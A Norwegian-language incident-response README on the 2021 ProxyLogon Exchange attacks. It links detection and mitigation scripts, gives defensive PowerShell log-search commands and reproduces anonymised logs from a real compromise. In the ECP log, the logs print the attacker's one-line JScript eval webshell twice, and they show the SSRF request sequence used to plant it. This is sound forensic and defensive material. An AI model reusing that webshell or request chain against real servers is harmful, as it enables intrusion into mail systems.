# 2021-march-exchange

Info
====
Et repo som samler litt nyttig informasjon ifm. Microsoft Exchange-sårbarheter og angrepskampanje JAN - MAR 2021.

_Edit 2021-03-10 13:35: Lagt til PS-skript for å sammenligne hasher fra Microsoft_

_Edit 2021-03-10 11:00: Lagt til `-Force` på PowerShell-kommandoer_

_Edit 2021-03-11 10:40: Lagt loggdata fra reell hendelse_

Ekstern informasjon
======
https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/

https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/

https://www.praetorian.com/blog/reproducing-proxylogon-exploit/

https://redcanary.com/blog/microsoft-exchange-attacks/

https://www.huntress.com/resources/tradecraft-tuesday/exploiting-cves-and-on-prem-exchange-servers

Scripts / verktøy
=======
Filhashverifisering
-------
*OBS!* Dette scriptet kan gi falske positiver på en del Javascript-filer. *OBS!*

PowerShell-skript fra Microsoft for å sammenligne hasher på lokal server mot verifiserte hasher fra Microsoft:

https://github.com/microsoft/CSS-Exchange/tree/main/Security#compareexchangehashesps1

Nettverksskanning
-------
nmap-script fra Microsoft for å oppdage sårbar Exchange:

https://github.com/microsoft/CSS-Exchange/tree/main/Security#http-vuln-cve2021-26855nse

Quickfix
------
PowerShell-script for å mitigere SSRF-sårbarheten som ble brukt i angrepskampanjen:

https://github.com/microsoft/CSS-Exchange/tree/main/Security#backendcookiemitigationps1

OBS: Vi anbefaler oppdatering så fort det lar seg gjøre. Dette er et sikringstiltak fram til oppdatering er gjennomført.

Webshellsøk
------
PowerShell-script fra CERT-LV for å oppdage webshells: 

https://github.com/cert-lv/exchange_webshell_detection/blob/main/detect_webshells.ps1

Powershell-onliner for å oppdage nylig opprettede .aspx-filer, som ofte vil være tilfellet for webshell:
```powershell
Get-ChildItem -Force -Path 'C:' -Filter *.aspx -Recurse -ErrorAction SilentlyContinue | ? {$_.LastWriteTime -gt (Get-Date).AddDays(-10)}
```
Generelt kan vi anbefale å varsle om nyopprettede/endrede filer i web-mapper (både aspx-filer og andre) og sammenlikne dette med endringskalender for virksomheten. Nye filer og endringer i filer som ikke ellers kan forklares bør undersøkes grundig. Om man f.eks. har Sysmon installert og config justert riktig kan man søke etter Eventcode 11 og filepath C:\inetpub\wwwroot*.

Loggsøk, passorddumper, zip-filer
------
PowerShell-script for å søke etter indikatorer på utnyttelse av CVE-2021-26855, 26858, 26857 og 27065, samt etter LSASS-dumps:

https://github.com/microsoft/CSS-Exchange/tree/main/Security#test-proxylogonps1

Powershell-online for å søke på tvers av logger, eksempelvis for requestIDer eller IP-adresser:
```powershell
Get-ChildItem -Force -Recurse -Path "C:\Program Files\Microsoft\Exchange Server\V15\Logging" -Filter '*.log' | % { $content = get-content -path $_.fullname | select-string 'søkestreng'; if($content) {write-host $_.fullname; $content; write-output '-----'   }  }
```

Nye brukere
------
PowerShell-script for å hente ut brukere opprettet siste 30 dager (hentet fra https://community.spiceworks.com/topic/581589-active-directory-powershell-script-list-all-newly-created-users-for-a-specific-m):
```powershell
Import-Module -Name ActiveDirectory
$date = (get-Date).tostring()
$month = (Get-Date).AddDays(-30)
Get-ADUser -Filter * -Properties whencreated | where { $_.whenCreated -ge $month } | select name,whenCreated
```

Stand-alone malwarescanner fra Microsoft:
------
https://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/safety-scanner-download

Instruksjoner for bruk av Microsoft Safety Scanner:

https://github.com/microsoft/CSS-Exchange/blob/main/Security/Defender-MSERT-Guidance.md


Loggdata
======

Loggdata fra utnyttelse av sårbarheten og planting av webshell
------
* xxx = loggfelt anonymisert
* servernavn = navn på serveren
* serverip = IP på serveren
* logger over flere dager er adskilt med "-----".

En rekke kolonner er fjernet for at interessante/relevante kolonner skal gjøres mer tydelige.

- Webshell plantes ved aksess mot `servernavn.xxx.local:444/ecp/DDI/DDIService.svc/SetObject` som resulterer i kjøring av kommandoen `Set-OabVirtualDirectory.ExternalUrl`.
- Kjøring av Microsoft Safety Scanner detekterer webshell på `C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\RedirSuiteServerProxy.aspx`
- Angriper utfører kun sjekk for å se om webshellet finnes, da ingen request-parameter sendes til webshellet.

Funn fra Test-ProxyLogon.ps1, HTTP-proxy-logg, CVE-2021-26855
-----
C:\Program Files\Microsoft\Exchange Server\V15\Logging\HttpProxy\Ecp\HttpProxy.LOG
```
#TYPE Selected.System.Management.Automation.PSCustomObject
"DateTime","RequestId","ClientIpAddress","UrlHost","UrlStem","RoutingHint","UserAgent","AnchorMailbox","HttpStatus"
"2021-03-03T06:49:42.162Z","xxx","130.255.189.21","mail.xxx.no","/ecp/y.js","X-BEResource-Cookie","ExchangeServicesClient/0.0.0.0","ServerInfo~a]@servernavn.xxx.local:444/autodiscover/autodiscover.xml?#","200"
"2021-03-03T06:49:43.699Z","xxx","130.255.189.21","mail.xxx.no","/ecp/y.js","X-BEResource-Cookie","python-requests/2.25.1","ServerInfo~a]@servernavn.xxx.local:444/mapi/emsmdb/?#","200"
"2021-03-03T06:49:46.210Z","xxx","130.255.189.21","mail.xxx.no","/ecp/y.js","X-BEResource-Cookie","python-requests/2.25.1","ServerInfo~a]@servernavn.xxx.local:444/ecp/proxyLogon.ecp?#","241"
"2021-03-03T06:49:51.543Z","xxx","130.255.189.21","mail.xxx.no","/ecp/y.js","X-BEResource-Cookie","python-requests/2.25.1","ServerInfo~a]@servernavn.xxx.local:444/ecp/DDI/DDIService.svc/GetObject?msExchEcpCanary=M1xSxxxDuw.&schema=OABVirtualDirectory#","200"
"2021-03-03T06:59:10.817Z","xxx","130.255.189.21","autodiscover.xxx.no","/ecp/y.js","X-BEResource-Cookie","ExchangeServicesClient/0.0.0.0","ServerInfo~a]@servernavn.xxx.local:444/autodiscover/autodiscover.xml?#","200"
"2021-03-03T06:59:11.840Z","xxx","130.255.189.21","autodiscover.xxx.no","/ecp/y.js","X-BEResource-Cookie","python-requests/2.25.1","ServerInfo~a]@servernavn.xxx.local:444/mapi/emsmdb/?#","200"
"2021-03-03T06:59:13.030Z","xxx","130.255.189.21","autodiscover.xxx.no","/ecp/y.js","X-BEResource-Cookie","python-requests/2.25.1","ServerInfo~a]@servernavn.xxx.local:444/ecp/proxyLogon.ecp?#","241"
"2021-03-03T06:59:14.588Z","xxx","130.255.189.21","autodiscover.xxx.no","/ecp/y.js","X-BEResource-Cookie","python-requests/2.25.1","ServerInfo~a]@servernavn.xxx.local:444/ecp/DDI/DDIService.svc/GetObject?msExchEcpCanary=8BeqxxxWYd1L8.&schema=OABVirtualDirectory#","200"
"2021-03-03T06:59:18.042Z","xxx","130.255.189.21","autodiscover.xxx.no","/ecp/y.js","X-BEResource-Cookie","python-requests/2.25.1","ServerInfo~a]@servernavn.xxx.local:444/ecp/DDI/DDIService.svc/SetObject?msExchEcpCanary=8BeqxxxWYd1L8.&schema=OABVirtualDirectory#","200"
"2021-03-03T06:59:20.359Z","xxx","130.255.189.21","autodiscover.xxx.no","/ecp/y.js","X-BEResource-Cookie","python-requests/2.25.1","ServerInfo~a]@servernavn.xxx.local:444/ecp/DDI/DDIService.svc/SetObject?msExchEcpCanary=8BeqxxxWYd1L8.&schema=ResetOABVirtualDirectory#","200"
"2021-03-03T06:59:23.288Z","xxx","130.255.189.21","autodiscover.xxx.no","/ecp/y.js","X-BEResource-Cookie","python-requests/2.25.1","ServerInfo~a]@servernavn.xxx.local:444/ecp/DDI/DDIService.svc/SetObject?msExchEcpCanary=8BeqxxxWYd1L8.&schema=OABVirtualDirectory#","200"
```

Funn fra Test-ProxyLogon.ps1, utvalgte felter fra ECP-logg, CVE-2021-27065:
------
C:\Program Files\Microsoft\Exchange Server\V15\Logging\ECP\Server\ECPServer20210303-1.LOG
```
#Software: Microsoft Exchange Server
#Log-type: ECP Server Log
Felter: Timestamp, kommando, respons
innslag knyttet til msExchEcpCanary=M1xSxxxDuw (fra httpproxy-logg over)
2021-03-03T06:49:51.389Z,S:CMD=Get-OabVirtualDirectory.ADPropertiesOnly=$true.Identity=$null;;S:EX=
2021-03-03T06:49:51.497Z,S:CMD=Pipeline.1|Get-MailboxRegionalConfiguration;;S:EX=
2021-03-03T06:49:53.772Z,'S:CMD=Set-OabVirtualDirectory.ExternalUrl=''http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""klk123456""],""unsafe"");}</script>''.Identity=''982d48c8-8bfa-4b6b-b431-53fd7ea4e9b3'''
2021-03-03T06:49:53.834Z,'S:CMD=Get-OabVirtualDirectory.ADPropertiesOnly=$true.Identity=''982d48c8-8bfa-4b6b-b431-53fd7ea4e9b3''';;S:EX=
2021-03-03T06:49:58.284Z,'S:CMD=Get-OABVirtualDirectory.Identity=''982d48c8-8bfa-4b6b-b431-53fd7ea4e9b3''';;S:EX=
2021-03-03T06:49:58.420Z,'S:CMD=Get-ExchangeServer.Identity=''servernavn''';;S:EX=
2021-03-03T06:49:58.835Z,'S:CMD=Set-OabVirtualDirectory.ExternalUrl=$null.Identity=''982d48c8-8bfa-4b6b-b431-53fd7ea4e9b3''';;'S:EX=Microsoft.Exchange.Data.Directory.ADNoSuchObjectException:Active Directory operation failed on 10227-OAD-W001.xxx.local. The object ''CN=OAB (Default Web Site),CN=HTTP,CN=Protocols,CN=servernavn,CN=Servers,CN=Exchange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=XXX,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=xxx,DC=local'' does not exist.\r\n\r\nThe object does not exist.\r\n'
2021-03-03T06:50:00.717Z,'S:CMD=Remove-OABVirtualDirectory.Force=$true.Identity=''servernavn\OAB (Default Web Site)''';;S:EX=
2021-03-03T06:50:08.396Z,'S:CMD=New-OABVirtualDirectory.WebSiteName=''Default Web Site''.Server=''servernavn''.Role=''ClientAccess''.InternalURL=''https://servernavn.xxx.local/OAB''.Path=''C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\OAB''';;S:EX=
2021-03-03T06:50:08.441Z,'S:CMD=Get-OabVirtualDirectory.ADPropertiesOnly=$true.Identity=''servernavn\OAB (Default Web Site)''';;S:EX=

innslag knyttet til msExchEcpCanary=8BeqxxxWYd1L8 (fra httpproxy-logg over)
2021-03-03T06:59:14.518Z,S:CMD=Get-OabVirtualDirectory.ADPropertiesOnly=$true.Identity=$null;;S:EX=
2021-03-03T06:59:14.571Z,S:CMD=Pipeline.1|Get-MailboxRegionalConfiguration;;S:EX=
2021-03-03T06:59:17.960Z,'S:CMD=Set-OabVirtualDirectory.ExternalUrl=''http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""klk123456""],""unsafe"");}</script>''.Identity=''ecd24641-d37f-4974-89f5-2e85ef7fb8d4'''
2021-03-03T06:59:18.021Z,'S:CMD=Get-OabVirtualDirectory.ADPropertiesOnly=$true.Identity=''ecd24641-d37f-4974-89f5-2e85ef7fb8d4''';;S:EX=
2021-03-03T06:59:21.512Z,'S:CMD=Get-OABVirtualDirectory.Identity=''ecd24641-d37f-4974-89f5-2e85ef7fb8d4''';;S:EX=
2021-03-03T06:59:23.212Z,'S:CMD=Set-OabVirtualDirectory.ExternalUrl=$null.Identity=''ecd24641-d37f-4974-89f5-2e85ef7fb8d4''';;S:EX=
2021-03-03T06:59:23.262Z,'S:CMD=Get-OabVirtualDirectory.ADPropertiesOnly=$true.Identity=''ecd24641-d37f-4974-89f5-2e85ef7fb8d4''';;S:EX=
```

Aksess mot webshell, IIS-logg:
------
C:\inetpub\logs\LogFiles\W3SVC1\u_ex21030*.log
```
2021-03-05 03:06:27 xxx GET /owa/auth/RedirSuiteServerProxy.aspx &CorrelationID=<empty>;&cafeReqId=cde28fc4-299e-4179-b3e9-de56f5c1d9ee;&encoding=; 443 - 139.162.202.236 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/65.0.2345+Safari/537.36 - 200 0 0 133
2021-03-05 08:11:58 xxx GET /owa/auth/RedirSuiteServerProxy.aspx &CorrelationID=<empty>;&cafeReqId=8c4553be-4082-4ea1-8872-bf21a831ee95;&encoding=; 443 - 139.162.202.236 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/65.0.2345+Safari/537.36 - 200 0 0 33
-----
2021-03-06 17:27:45 xxx GET /owa/auth/RedirSuiteServerProxy.aspx &CorrelationID=<empty>;&cafeReqId=556e0901-7c69-4963-9e99-3ece666e792f;&encoding=; 443 - 67.205.176.9 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/88.0.4324.182+Safari/537.36 - 200 0 0 115
2021-03-06 17:27:45 xxx GET /owa/auth/RedirSuiteServerProxy.aspx &CorrelationID=<empty>;&cafeReqId=877637d6-03ba-4cc5-bc9d-f8ad7761b607;&encoding=; 443 - 67.205.176.9 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/88.0.4324.182+Safari/537.36 - 200 0 0 104
2021-03-06 17:27:45 xxx GET /owa/auth/RedirSuiteServerProxy.aspx &CorrelationID=<empty>;&cafeReqId=3ec7b8e9-65bf-4717-ac70-a7fc251cf3b2;&encoding=; 443 - 67.205.176.9 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/88.0.4324.182+Safari/537.36 - 200 0 0 101
-----
2021-03-08 20:37:27 xxx GET /owa/auth/RedirSuiteServerProxy.aspx &CorrelationID=<empty>;&cafeReqId=3aef83a1-4149-4d14-aee4-8c18470818e0;&encoding=; 443 - 67.205.176.9 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/88.0.4324.182+Safari/537.36 - 302 0 0 112
2021-03-08 20:37:28 xxx GET /owa/auth/RedirSuiteServerProxy.aspx &CorrelationID=<empty>;&cafeReqId=01a0d5ce-e246-4189-bf77-b06807ff9f5c;&encoding=; 443 - 67.205.176.9 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/88.0.4324.182+Safari/537.36 - 302 0 0 101
2021-03-08 20:37:28 xxx GET /owa/auth/RedirSuiteServerProxy.aspx &CorrelationID=<empty>;&cafeReqId=db511d6d-3a87-447c-bfdd-656cc48b722a;&encoding=; 443 - 67.205.176.9 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/88.0.4324.182+Safari/537.36 - 302 0 0 101
```
PowerShell-kommando for loggsøk:
```powershell
Get-ChildItem -Force -Recurse -Path "C:\inetpub\logs\LogFiles\W3SVC1\" -Filter '*.log' | % { $content = get-content -path $_.fullname | select-string 'RedirSuiteServerProxy.aspx'; if($content) {write-host $_.fullname; $content; write-output '-----'   }  }
```

Alle hits fra 139.162.202.236, OWA-logg:
-------
C:\Program Files\Microsoft\Exchange Server\V15\Logging\HttpProxy\Owa\HttpProxy_202103*-1.LOG
```
timestamp,hostname,urlpath,useragent,httpstatuskode,http-metode
2021-03-05T03:06:27.696Z,serverip,/owa/auth/RedirSuiteServerProxy.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/65.0.2345 Safari/537.36,139.162.202.236,200,GET
2021-03-05T08:11:58.846Z,serverip,/owa/auth/RedirSuiteServerProxy.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/65.0.2345 Safari/537.36,139.162.202.236,200,GET
2021-03-09T02:55:13.675Z,serverip,/owa/auth/OutlookEN.aspx,Mozilla/5.0 (Windows NT 10.0; Win64;x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/65.0.2345 Safari/537.36,139.162.202.236,302,GET
2021-03-09T03:26:21.089Z,serverip,/owa/auth/TimeoutLogout.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/65.0.2345 Safari/537.36,139.162.202.236,302,GET
2021-03-09T06:44:39.999Z,serverip,/owa/auth/TimeoutLogout.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/87.0.1125 Safari/537.36,139.162.202.236,302,GET
```
PowerShell-kommando for loggsøk:
```powershell
Get-ChildItem -Force -Recurse -Path "C:\Program Files\Microsoft\Exchange Server\V15\Logging\" -Filter '*.log' | % { $content = get-content -path $_.fullname | select-string '139.162.202.236'; if($content) {write-host $_.fullname; $content; write-output '-----'   }  }
```

Alle hits fra 67.205.176.9, OWA-logg:
-------
C:\Program Files\Microsoft\Exchange Server\V15\Logging\HttpProxy\Owa\HttpProxy_202103*-1.LOG
```
timestamp,hostname,urlpath,useragent,httpstatuskode,http-metode
2021-03-06T17:27:44.124Z,serverip,/owa/auth/Current/themes/errorFS.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-06T17:27:44.198Z,mail.xxx.no,/owa/auth/Current/themes/errorFS.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-06T17:27:44.301Z,autodiscover.xxx.no,/owa/auth/Current/themes/errorFS.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-06T17:27:44.923Z,serverip,/owa/auth/RedirSuiteServerProxy.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,200,GET
2021-03-06T17:27:45.009Z,mail.xxx.no,/owa/auth/RedirSuiteServerProxy.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,200,GET
2021-03-06T17:27:45.345Z,autodiscover.xxx.no,/owa/auth/RedirSuiteServerProxy.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,200,GET
2021-03-06T17:27:49.335Z,serverip,/owa/auth/ErrorAA.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-06T17:27:49.830Z,mail.xxx.no,/owa/auth/ErrorAA.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-06T17:27:49.873Z,autodiscover.xxx.no,/owa/auth/ErrorAA.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-06T17:27:50.622Z,serverip,/owa/auth/OutlookEN.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-06T17:27:51.508Z,autodiscover.xxx.no,/owa/auth/OutlookEN.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-06T17:27:51.519Z,mail.xxx.no,/owa/auth/OutlookEN.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-06T17:27:52.323Z,serverip,/owa/auth/zntwv.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-06T17:27:52.581Z,mail.xxx.no,/owa/auth/zntwv.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-06T17:27:52.819Z,autodiscover.xxx.no,/owa/auth/zntwv.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-06T17:27:53.565Z,autodiscover.xxx.no,/owa/auth/Current/scripts/premium/fexppw.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-06T17:27:53.782Z,serverip,/owa/auth/Current/scripts/premium/fexppw.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-06T17:27:53.850Z,mail.xxx.no,/owa/auth/Current/scripts/premium/fexppw.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-06T17:27:54.560Z,autodiscover.xxx.no,/owa/auth/OutlookEN.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-06T17:27:54.791Z,serverip,/owa/auth/OutlookEN.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-06T17:27:55.256Z,mail.xxx.no,/owa/auth/OutlookEN.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-06T17:27:55.283Z,autodiscover.xxx.no,/owa/auth/getpp.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-06T17:27:55.572Z,serverip,/owa/auth/getpp.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-06T17:27:56.491Z,autodiscover.xxx.no,/owa/auth/Err0r.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-06T17:27:56.765Z,serverip,/owa/auth/Err0r.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-06T17:27:56.867Z,mail.xxx.no,/owa/auth/getpp.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-06T17:27:57.704Z,autodiscover.xxx.no,/owa/auth/Currentthemes/resources/win.ashx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-06T17:27:57.712Z,serverip,/owa/auth/Currentthemes/resources/win.ashx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-06T17:27:57.813Z,mail.xxx.no,/owa/auth/Err0r.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-06T17:27:58.575Z,autodiscover.xxx.no,/owa/auth/Current/scripts/premium/fexppw.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-06T17:27:58.684Z,serverip,/owa/auth/Current/scripts/premium/fexppw.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-06T17:27:59.082Z,mail.xxx.no,/owa/auth/Currentthemes/resources/win.ashx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-06T17:27:59.844Z,mail.xxx.no,/owa/auth/Current/scripts/premium/fexppw.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
-----
2021-03-08T20:37:25.554Z,autodiscover.xxx.no,/owa/auth/928ccfacbe.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:25.717Z,mail.xxx.no,/owa/auth/928ccfacbe.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:26.347Z,serverip,/owa/auth/928ccfacbe.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:26.375Z,autodiscover.xxx.no,/owa/auth/Current/themes/errorFS.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:27.051Z,mail.xxx.no,/owa/auth/Current/themes/errorFS.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:27.400Z,autodiscover.xxx.no,/owa/auth/RedirSuiteServerProxy.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:27.535Z,serverip,/owa/auth/Current/themes/errorFS.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:28.291Z,mail.xxx.no,/owa/auth/RedirSuiteServerProxy.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:28.719Z,serverip,/owa/auth/RedirSuiteServerProxy.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:34.175Z,autodiscover.xxx.no,/owa/auth/ErrorAA.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:34.817Z,mail.xxx.no,/owa/auth/ErrorAA.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:35.223Z,serverip,/owa/auth/ErrorAA.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:35.423Z,autodiscover.xxx.no,/owa/auth/OutlookEN.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:35.906Z,mail.xxx.no,/owa/auth/OutlookEN.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:36.446Z,serverip,/owa/auth/OutlookEN.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:36.557Z,autodiscover.xxx.no,/owa/auth/zntwv.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:37.099Z,mail.xxx.no,/owa/auth/zntwv.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:37.772Z,serverip,/owa/auth/zntwv.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
